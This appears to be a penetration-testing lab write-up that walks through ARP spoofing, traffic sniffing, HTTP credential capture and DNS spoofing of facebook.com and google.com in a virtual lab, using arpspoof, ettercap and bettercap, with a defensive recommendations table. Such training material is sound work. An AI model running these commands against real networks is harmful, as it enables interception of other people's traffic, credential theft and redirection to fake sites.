# 🧪 Lab 03: Network Hacking — Post-Connection Attacks (ARP Spoofing & MITM)

<div align="center">

**Category:** Network Exploitation &nbsp;|&nbsp; **Difficulty:** Intermediate &nbsp;|&nbsp; **Status:** ✅ Completed

</div>

---

## 📋 Lab Overview

| Field | Details |
|---|---|
| **Objective** | Exploit Layer 2 (ARP) vulnerabilities to intercept, analyze, and manipulate network traffic |
| **Attacker Machine** | Kali Linux VM (`10.0.2.x`) |
| **Target Machine** | Windows VM (`10.0.2.x`) |
| **Gateway** | Virtual Router (`10.0.2.1`) |
| **Key Tools** | `arp-scan`, `netdiscover`, `arpspoof`, `wireshark`, `urlsnarf`, `driftnet`, `ettercap` |
| **MITRE ATT&CK** | T1557.002 (ARP Cache Poisoning), T1040 (Network Sniffing), T1557 (Adversary-in-the-Middle) |
| **Completion Date** | 27-03-2025 |

### Why This Lab Matters
Once you're on a network (post-connection), the real danger begins. ARP Spoofing allows an attacker to:
- **Intercept all traffic** between any device and the router
- **Steal credentials** sent over HTTP
- **Redirect DNS queries** to malicious sites
- **Inject code** into web pages the victim is browsing

This is one of the most powerful and commonly demonstrated attacks in penetration testing.

---

## 🏗️ Attack Flow Diagram

```
 BEFORE ARP SPOOFING (Normal Network Flow):

    Victim (Windows)                         Router (Gateway)
    10.0.2.15                                10.0.2.1
    MAC: AA:AA:AA:AA:AA:AA                   MAC: CC:CC:CC:CC:CC:CC
         │                                        │
         │◄──────── Normal Traffic ───────────────►│
         │          Direct connection              │


 AFTER ARP SPOOFING (Attacker in the Middle):

    Victim (Windows)          Attacker (Kali)           Router (Gateway)
    10.0.2.15                 10.0.2.5                  10.0.2.1
    MAC: AA:AA:AA             MAC: BB:BB:BB             MAC: CC:CC:CC
         │                         │                         │
         │  "Router is at          │   "Victim is at        │
         │   BB:BB:BB"             │    BB:BB:BB"           │
         │◄────────────────────────│────────────────────────►│
         │                         │                         │
         │   ALL TRAFFIC FLOWS     │   ALL TRAFFIC FLOWS    │
         │   THROUGH ATTACKER!     │   THROUGH ATTACKER!    │
         │                    🎯 INTERCEPT 🎯                │
```

---

## 🔧 Prerequisites

- ✅ Lab environment setup complete (Lab 01)
- ✅ Both VMs on same NAT Network
- ✅ Kali and Windows can ping each other
- ✅ Windows Defender & Firewall disabled on target

---

## 📝 Step-by-Step Walkthrough

### Step 1: Network Discovery — Find All Devices

Before attacking, you need to know what's on the network. Two tools for this:

**Method A: Using `arp-scan`**
```bash
# Scan the entire local network
sudo arp-scan --localnet

# Expected output:
# Interface: eth0, type: EN10MB, MAC: 08:00:27:xx:xx:xx, IPv4: 10.0.2.5
# Starting arp-scan 1.10.0
# 10.0.2.1    52:54:00:12:35:00   QEMU
# 10.0.2.2    52:54:00:12:35:00   QEMU
# 10.0.2.15   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH (Windows VM)
#
# 3 packets received by filter, 0 packets dropped by kernel
```

**Method B: Using `netdiscover`**
```bash
# Passive + active network discovery
sudo netdiscover -i eth0

# Output shows discovered devices in a live-updating table:
#  IP            MAC Address       Count  Len   Vendor
#  10.0.2.1      52:54:00:12:35:00  1      60    QEMU
#  10.0.2.15     08:00:27:aa:bb:cc  1      60    PCS Systemtechnik
```

**Document your findings:**

| Device | IP Address | MAC Address | Role |
|---|---|---|---|
| Virtual Router | `10.0.2.1` | `52:54:00:12:35:00` | Gateway |
| Kali (You) | `10.0.2.5` | `08:00:27:xx:xx:xx` | Attacker |
| Windows VM | `10.0.2.15` | `08:00:27:aa:bb:cc` | Target/Victim |

---

### Step 2: Understanding ARP Protocol (Know What You're Exploiting)

ARP (Address Resolution Protocol) translates IP addresses to MAC addresses. It's the backbone of local network communication — and it has **zero authentication**.

```
HOW ARP NORMALLY WORKS:

  Victim wants to reach the Router (10.0.2.1):

  1. Victim broadcasts: "Who has 10.0.2.1? Tell 10.0.2.15"
     └── ARP Request (broadcast to everyone)

  2. Router responds: "10.0.2.1 is at MAC CC:CC:CC:CC:CC:CC"
     └── ARP Reply (unicast back to victim)

  3. Victim saves this in ARP cache:
     └── 10.0.2.1 → CC:CC:CC:CC:CC:CC  ✅ Correct


THE VULNERABILITY:
  - ARP has NO authentication
  - ANY device can send ARP replies
  - Victims blindly trust ALL ARP replies
  - This means an attacker can send FAKE ARP replies!
```

**Check the victim's ARP cache before the attack (on Windows):**
```cmd
arp -a

REM Expected output:
REM   10.0.2.1    52-54-00-12-35-00    dynamic    ← Real router MAC
```

---

### Step 3: Enable IP Forwarding (CRITICAL — Do This First!)

Without IP forwarding, the victim's traffic reaches your Kali machine and **gets dropped** — causing a denial of service instead of a man-in-the-middle attack.

```bash
# Enable IP forwarding in the Linux kernel
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Verify it's enabled
cat /proc/sys/net/ipv4/ip_forward
# Output should be: 1
```

**What this does:**
```
WITHOUT IP forwarding:
  Victim → Sends packet → Arrives at Kali → 💀 DROPPED (victim loses internet)

WITH IP forwarding:
  Victim → Sends packet → Arrives at Kali → ✅ FORWARDED to Router → Internet
  Internet → Reply → Router → Kali → ✅ FORWARDED to Victim
  
  👆 Traffic flows normally, but Kali sees EVERYTHING
```

> ⚠️ **This was a real issue I encountered!** The victim completely lost internet until I enabled IP forwarding. See the Issues Log below.

---

### Step 4: Execute ARP Spoofing (Bidirectional)

You need **two terminal windows** — one to poison the victim, one to poison the router.

**Terminal 1 — Poison the Victim:**
```bash
# Tell the victim: "I am the router" (send fake ARP replies)
sudo arpspoof -i eth0 -t <VICTIM-IP> <ROUTER-IP>

# Example:
sudo arpspoof -i eth0 -t 10.0.2.15 10.0.2.1

# Output (continuous):
# 8:0:27:xx:xx:xx 8:0:27:aa:bb:cc 0806 42: arp reply 10.0.2.1 is-at 8:0:27:xx:xx:xx
# 8:0:27:xx:xx:xx 8:0:27:aa:bb:cc 0806 42: arp reply 10.0.2.1 is-at 8:0:27:xx:xx:xx
```

**Terminal 2 — Poison the Router:**
```bash
# Tell the router: "I am the victim" (send fake ARP replies)
sudo arpspoof -i eth0 -t <ROUTER-IP> <VICTIM-IP>

# Example:
sudo arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
```

**Why Both Directions?**
```
One-way only (victim poisoned only):
  You see: Victim → Kali → Router  (requests only)
  You miss: Router → Victim         (responses go direct, you don't see them)

Bidirectional (both poisoned):
  You see: Victim → Kali → Router   (requests ✅)
  You see: Router → Kali → Victim   (responses ✅)
  
  🎯 Full traffic interception!
```

---

### Step 5: Verify the ARP Cache is Poisoned

**On the Windows victim, check the ARP table:**
```cmd
arp -a

REM Before attack:
REM   10.0.2.1    52-54-00-12-35-00    dynamic    ← Real router MAC
REM   10.0.2.5    08-00-27-xx-xx-xx    dynamic    ← Kali MAC

REM After attack (POISONED):
REM   10.0.2.1    08-00-27-xx-xx-xx    dynamic    ← Kali's MAC! Router entry hijacked!
REM   10.0.2.5    08-00-27-xx-xx-xx    dynamic    ← Kali's real MAC
REM              ^^^^^^^^^^^^^^^^^^
REM   Router's IP now points to ATTACKER's MAC address!
```

> 🎯 **Success Indicator:** The router's IP (10.0.2.1) now shows **Kali's MAC address** instead of the real router MAC. All traffic meant for the router now flows through your machine.

---

### Step 6: Sniff the Intercepted Traffic

Now that you're in the middle, capture and analyze the traffic:

**Method A: Sniff HTTP URLs (what websites the victim visits)**
```bash
sudo urlsnarf -i eth0

# Output:
# 10.0.2.15 - - "GET http://testphp.vulnweb.com/login.php HTTP/1.1"
# 10.0.2.15 - - "POST http://testphp.vulnweb.com/userinfo.php HTTP/1.1"
```

**Method B: Sniff images being loaded**
```bash
sudo driftnet -i eth0

# Opens a window showing all images passing through the network in real-time
```

**Method C: Full packet capture with Wireshark**
```bash
# Launch Wireshark on the intercepted interface
sudo wireshark &

# Select interface: eth0
# Start capture
# Apply filter: http
# Look for POST requests containing usernames/passwords
```

**Method D: Capture credentials with Ettercap**
```bash
# Ettercap automatically extracts login credentials
sudo ettercap -T -q -i eth0

# When victim logs into an HTTP site:
# HTTP : 10.0.2.15 -> testphp.vulnweb.com
# USER: admin  PASS: password123
```

---

### Step 7: DNS Spoofing (Redirect Victim to Fake Sites)

DNS Spoofing lets you redirect the victim to any IP when they visit a specific domain.

**Step 7a: Configure the DNS spoof file:**
```bash
# Edit the Ettercap DNS config
sudo nano /etc/ettercap/etter.dns

# Add entries to redirect domains to your Kali IP:
# Format: domain    A    attacker-ip

*.facebook.com     A    10.0.2.5
*.google.com       A    10.0.2.5
facebook.com       A    10.0.2.5
```

**Step 7b: Start a web server on Kali to serve a fake page:**
```bash
# Start Apache (will serve content from /var/www/html/)
sudo service apache2 start

# Create a simple phishing page (for lab demonstration only)
echo "<h1>This page has been hacked - Lab Demo</h1>" | sudo tee /var/www/html/index.html
```

**Step 7c: Launch the DNS Spoof attack:**
```bash
# Using Ettercap with ARP spoofing + DNS spoofing plugin
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /<VICTIM-IP>// /<ROUTER-IP>//

# Example:
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.0.2.15// /10.0.2.1//
```

**What happens:**
```
Victim types: facebook.com in browser
  ↓
DNS query → Intercepted by Kali
  ↓
Kali responds: "facebook.com is at 10.0.2.5" (YOUR IP)
  ↓
Victim's browser loads YOUR fake page instead of Facebook!
```

---

### Step 8: Using Bettercap (Modern Alternative)

Bettercap is a modern, all-in-one MITM framework that replaces multiple older tools.

```bash
# Install bettercap
sudo apt install bettercap -y

# Launch bettercap
sudo bettercap -iface eth0

# Inside bettercap interactive console:

# Step 1: Discover devices
> net.probe on
> net.show

# Step 2: Set target
> set arp.spoof.targets 10.0.2.15

# Step 3: Enable ARP spoofing
> arp.spoof on

# Step 4: Enable network sniffing
> net.sniff on

# Step 5: (Optional) Enable DNS spoofing
> set dns.spoof.domains facebook.com,google.com
> set dns.spoof.address 10.0.2.5
> dns.spoof on
```

**Bettercap Advantages over Traditional Tools:**
| Feature | Traditional | Bettercap |
|---|---|---|
| ARP Spoofing | `arpspoof` (separate tool) | Built-in |
| Network Sniffing | `wireshark` / `urlsnarf` | Built-in |
| DNS Spoofing | `ettercap` plugin | Built-in |
| HTTPS Downgrade | `sslstrip` (separate) | Built-in module |
| All-in-one | ❌ Need 4+ tools | ✅ Single framework |

---

## 📊 Lab Results — ARP Spoofing Incident (27-03-2025)

| Objective | Status | Evidence / Notes |
|---|---|---|
| Network Discovery completed | ✅ | Found 3 devices: Router, Kali, Windows |
| IP Forwarding enabled | ✅ | Critical — prevents denial of service |
| Victim ARP Cache poisoned | ✅ | Verified via `arp -a` on Windows — router MAC changed to Kali's MAC |
| Router ARP Cache poisoned | ✅ | Bidirectional spoofing active |
| Traffic captured successfully | ✅ | Observed HTTP requests from victim in real-time |
| HTTP credentials intercepted | ✅ | Captured cleartext username/password from test site |
| DNS Spoofing executed | ✅ | Victim redirected to fake page |

---

## ❌ Issues Encountered & Fixes

### Issue 1: Target Lost Internet Connectivity
| Field | Details |
|---|---|
| **Symptom** | Windows VM completely lost internet after ARP spoofing started |
| **Root Cause** | IP Forwarding was disabled (default `0` in Linux kernel) |
| **Impact** | Packets arrived at Kali but were dropped instead of forwarded |
| **Fix** | `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward` |
| **Prevention** | Always enable IP forwarding BEFORE starting ARP spoof |

### Issue 2: ARP Spoof Running but MAC Not Changing on Victim
| Field | Details |
|---|---|
| **Symptom** | `arpspoof` was sending packets, but victim's ARP table was unchanged |
| **Root Cause** | VMs were on regular NAT mode, not NAT Network — VMs couldn't see each other |
| **Impact** | ARP packets never reached the victim |
| **Fix** | Changed both VMs to the same "NAT Network" in VirtualBox settings |
| **Prevention** | Always verify VM network adapter is set to "NAT Network", not "NAT" |

---

## 🛡️ Defensive Recommendations

| Attack | Detection Method | Prevention |
|---|---|---|
| ARP Spoofing | Monitor for duplicate MAC entries in ARP table; use tools like `arpwatch` | Static ARP entries, Dynamic ARP Inspection (DAI) on switches |
| DNS Spoofing | DNSSEC validation; monitor for unexpected DNS responses | Use DNS-over-HTTPS (DoH); DNSSEC |
| Traffic Sniffing | Detect promiscuous mode adapters on network | Encrypt everything (HTTPS, VPN); avoid HTTP sites |
| Credential Theft | N/A (attacker technique) | Use HTTPS everywhere; HSTS preloading; 2FA |

---

## 🧠 Key Takeaways

1. **ARP has zero security** — It was designed in an era of trusted networks. Any device can claim to be any other device
2. **IP Forwarding is step zero** — Without it, you cause denial of service instead of interception
3. **Both directions matter** — Poisoning only the victim gives you half the traffic; poison both victim AND router for full interception
4. **HTTP is completely exposed** — Any credentials sent over HTTP can be read in plaintext during a MITM attack
5. **Bettercap replaces everything** — Modern pen testers use bettercap instead of juggling 4-5 separate tools

---

## 🔗 Navigation
⬅️ [Lab 02: Pre-Connection Attacks](../lab-02-network-pre-connection/README.md) &nbsp;|&nbsp; ➡️ [Lab 04: MITM Deep Dive](../lab-04-mitm-deep-dive/README.md)
